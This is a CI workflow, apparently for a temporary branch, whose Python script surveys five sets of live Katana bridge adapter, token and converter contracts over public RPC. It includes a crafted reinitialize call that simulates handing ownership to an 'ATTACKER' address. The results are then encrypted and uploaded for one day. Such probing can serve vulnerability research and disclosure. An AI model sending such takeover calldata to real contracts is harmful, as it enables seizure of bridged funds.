name: Temporary encrypted runtime census

on:
  push:
    branches:
      - tmp/runtime-census-41ff4bac

permissions:
  contents: read

jobs:
  census:
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
          fetch-depth: 1

      - name: Collect read-only runtime state
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p evidence
          cat > /tmp/census.py <<'PY'
          import json
          import time
          import urllib.request
          import urllib.error
          from pathlib import Path

          RPCS = [
              "https://rpc.katana.network/",
              "https://katana.gateway.tenderly.co/",
              "https://rpc.katanarpc.com/",
          ]

          ITEMS = [
              {
                  "id": "A1",
                  "adapter": "0x694d1697F6909361775139357d99fb60b5caB683",
                  "token": "0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62",
                  "converter": "0xa6b0db1293144ebe9478b6a84f75dd651e45914a",
              },
              {
                  "id": "A2",
                  "adapter": "0x807275727Dd3E640c5F2b5DE7d1eC72B4Dd293C0",
                  "token": "0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36",
                  "converter": "0x97a3500083348A147F419b8a65717909762c389f",
              },
              {
                  "id": "A3",
                  "adapter": "0x4690f346337eD8737BeA462ac71Ff16Ef95B985E",
                  "token": "0x2DCa96907fde857dd3D816880A0df407eeB2D2F2",
                  "converter": "0x053FA9b934b83E1E0ffc7e98a41aAdc3640bB462",
              },
              {
                  "id": "A4",
                  "adapter": "0xB42ab636ac69f073970a94d1ACE13379E7621665",
                  "token": "0x62D6A123E8D19d06d68cf0d2294F9A3A0362c6b3",
                  "converter": "0x639f13D5f30B47c792b6851238c05D0b623C77DE",
              },
              {
                  "id": "A5",
                  "adapter": "0x8169e532Bc781985e155037db1F96c267a520DFC",
                  "token": "0x0913DA6Da4b42f538B445599b46Bb4622342Cf52",
                  "converter": "0xb00aa68b87256E2F22058fB2Ba3246EEc54A44fc",
              },
          ]

          IMPL_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
          ADMIN_SLOT = "0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103"
          ROLE = "cfd53186d792f1ec9d0679afc2dc3ffc86fc31fe1e0f342b838eb6c3eade62b3"
          ATTACKER = "0x1111111111111111111111111111111111111111"

          SELECTORS = {
              "counter": "0x4267d865",
              "token": "0xfc0c546a",
              "owner": "0x8da5cb5b",
              "secondary_balance": "0xe8a2f224",
              "approval_required": "0x9f68b964",
              "endpoint": "0x5e280f11",
              "delegate": "0xc89e4361",
              "paused": "0x5c975abb",
              "version": "0x54fd4d50",
              "total_supply": "0x18160ddd",
              "native_converter": "0x45c78f1d",
              "bridge": "0xe78cea92",
              "lxly_bridge": "0x2bdbe6fb",
              "backing_secondary": "0xbd91bd21",
              "backing_layery": "0xf524fe57",
              "custom_token": "0x899e3106",
              "underlying_token": "0x2495a599",
          }

          def post(url, payload):
              data = json.dumps(payload, separators=(",", ":")).encode()
              req = urllib.request.Request(
                  url,
                  data=data,
                  headers={
                      "content-type": "application/json",
                      "user-agent": "runtime-census/1.0",
                  },
                  method="POST",
              )
              with urllib.request.urlopen(req, timeout=25) as resp:
                  return json.loads(resp.read().decode())

          selected = None
          probes = []
          for url in RPCS:
              try:
                  r = post(url, {"jsonrpc": "2.0", "id": 1, "method": "eth_chainId", "params": []})
                  probes.append({"url": url, "response": r})
                  if r.get("result") == "0xb67d2":
                      selected = url
                      break
              except Exception as exc:
                  probes.append({"url": url, "error": type(exc).__name__ + ": " + str(exc)})
          if not selected:
              raise SystemExit("no usable read-only endpoint")

          request_id = 10
          def rpc(method, params):
              global request_id
              request_id += 1
              try:
                  out = post(selected, {"jsonrpc": "2.0", "id": request_id, "method": method, "params": params})
                  if "error" in out:
                      return {"ok": False, "error": out["error"]}
                  return {"ok": True, "result": out.get("result")}
              except Exception as exc:
                  return {"ok": False, "transport_error": type(exc).__name__ + ": " + str(exc)}

          def word_address(addr):
              return addr.lower().removeprefix("0x").rjust(64, "0")

          def u256(value):
              return hex(value)[2:].rjust(64, "0")

          def call_data(selector, words=()):
              return selector + "".join(words)

          def reinitialize_probe(token):
              inner = (
                  "800215ef"
                  + word_address(token)
                  + u256(0)
                  + word_address(ATTACKER)
                  + word_address(ATTACKER)
              )
              padded = inner.ljust(((len(inner) + 63) // 64) * 64, "0")
              return (
                  "0xd6050eb0"
                  + u256(32)
                  + u256(1)
                  + u256(32)
                  + u256(len(inner) // 2)
                  + padded
              )

          report = {
              "created_unix": int(time.time()),
              "rpc_probes": probes,
              "selected_rpc": selected,
              "chain_id": rpc("eth_chainId", []),
              "block_number": rpc("eth_blockNumber", []),
              "items": [],
          }

          for item in ITEMS:
              adapter = item["adapter"]
              token = item["token"]
              converter = item["converter"]
              entry = dict(item)
              entry["adapter_code"] = rpc("eth_getCode", [adapter, "latest"])
              entry["implementation_slot"] = rpc("eth_getStorageAt", [adapter, IMPL_SLOT, "latest"])
              entry["admin_slot"] = rpc("eth_getStorageAt", [adapter, ADMIN_SLOT, "latest"])
              entry["adapter_calls"] = {
                  name: rpc("eth_call", [{"to": adapter, "data": selector}, "latest"])
                  for name, selector in SELECTORS.items()
                  if name in {
                      "counter", "token", "owner", "secondary_balance",
                      "approval_required", "endpoint", "delegate", "paused", "version"
                  }
              }
              for eid in (30101, 30102, 30110, 30184, 30243, 30367):
                  data = call_data("0xbb0b6a53", [u256(eid)])
                  entry.setdefault("peers", {})[str(eid)] = rpc(
                      "eth_call", [{"to": adapter, "data": data}, "latest"]
                  )

              role_data = call_data("0x91d14854", [ROLE, word_address(adapter)])
              entry["token_calls"] = {
                  "has_role_adapter": rpc("eth_call", [{"to": token, "data": role_data}, "latest"]),
                  "total_supply": rpc("eth_call", [{"to": token, "data": SELECTORS["total_supply"]}, "latest"]),
                  "native_converter": rpc("eth_call", [{"to": token, "data": SELECTORS["native_converter"]}, "latest"]),
                  "bridge": rpc("eth_call", [{"to": token, "data": SELECTORS["bridge"]}, "latest"]),
                  "lxly_bridge": rpc("eth_call", [{"to": token, "data": SELECTORS["lxly_bridge"]}, "latest"]),
                  "paused": rpc("eth_call", [{"to": token, "data": SELECTORS["paused"]}, "latest"]),
                  "version": rpc("eth_call", [{"to": token, "data": SELECTORS["version"]}, "latest"]),
              }
              entry["converter_calls"] = {
                  "backing_secondary": rpc("eth_call", [{"to": converter, "data": SELECTORS["backing_secondary"]}, "latest"]),
                  "backing_layery": rpc("eth_call", [{"to": converter, "data": SELECTORS["backing_layery"]}, "latest"]),
                  "custom_token": rpc("eth_call", [{"to": converter, "data": SELECTORS["custom_token"]}, "latest"]),
                  "underlying_token": rpc("eth_call", [{"to": converter, "data": SELECTORS["underlying_token"]}, "latest"]),
                  "paused": rpc("eth_call", [{"to": converter, "data": SELECTORS["paused"]}, "latest"]),
                  "version": rpc("eth_call", [{"to": converter, "data": SELECTORS["version"]}, "latest"]),
              }
              probe = reinitialize_probe(token)
              entry["reinitialize_eth_call"] = rpc(
                  "eth_call",
                  [{"from": ATTACKER, "to": adapter, "data": probe, "gas": "0x7a1200"}, "latest"],
              )
              report["items"].append(entry)

          Path("evidence/runtime.json").write_text(json.dumps(report, indent=2, sort_keys=True) + "\n")
          PY
          python3 /tmp/census.py

      - name: Encrypt evidence
        shell: bash
        run: |
          set -euo pipefail
          cat > /tmp/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAvso0BFVlF4X5sYTF3OqJ
          KblCavPStThpUt5GdILeRkL3QIv2aAip7ZRkmDb+joNZuPfpfQ9+VL5UFEi0IVmY
          oMjcyvFlLuJfPffDV8h322/c2eWtbGgDOvxJzQrWhGNERCLvPiN4/oucJ8eyoKpg
          5WLZsxf8rzFd5oUoWZ0r2Vr2g7KZEH059Zunfbfan7vo17fXFfrGYyKVnM0iwM3F
          08m6jxrCuDc7V3RHeolvQah3Tkh78PhYvE1E/dI6Cy6zWGasRvNwAYw0/80Tp8qf
          6ymo0A4hV2PliOUjNeHf1axyr9j0CI7POOD/Ui5dPdDPUZbpwFAutF9bKVbkm7NG
          AfLVARWu1aan+tsVsAFMPugAy30cvnkwRPi0ol3MNwaJNdpV3ajZwkx+u3BMC2XR
          xJHHeWQjFRkYeipotXnXtn+2WFNWzj27k13UdW1w7WUNJUDifeHWbsT1lXLbDqxd
          zWlLUqtBAbFL5SHTKE2/+iR78aGyuOPVfWKJG9a5awnBAgMBAAE=
          -----END PUBLIC KEY-----
          PEM
          tar -C evidence -czf /tmp/runtime.tar.gz runtime.json
          openssl rand -hex 32 > /tmp/key.hex
          openssl enc -aes-256-cbc -salt -pbkdf2 -iter 200000 \
            -in /tmp/runtime.tar.gz -out evidence/runtime.tar.gz.enc -pass file:/tmp/key.hex
          openssl pkeyutl -encrypt -pubin -inkey /tmp/public.pem \
            -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 \
            -in /tmp/key.hex -out evidence/key.enc
          sha256sum evidence/runtime.tar.gz.enc evidence/key.enc > evidence/SHA256SUMS.txt
          rm -f evidence/runtime.json /tmp/runtime.tar.gz /tmp/key.hex /tmp/census.py /tmp/public.pem

      - name: Upload encrypted evidence
        uses: actions/upload-artifact@v4
        with:
          name: runtime-census-41ff4bac-${{ github.run_id }}
          path: evidence/
          if-no-files-found: error
          retention-days: 1
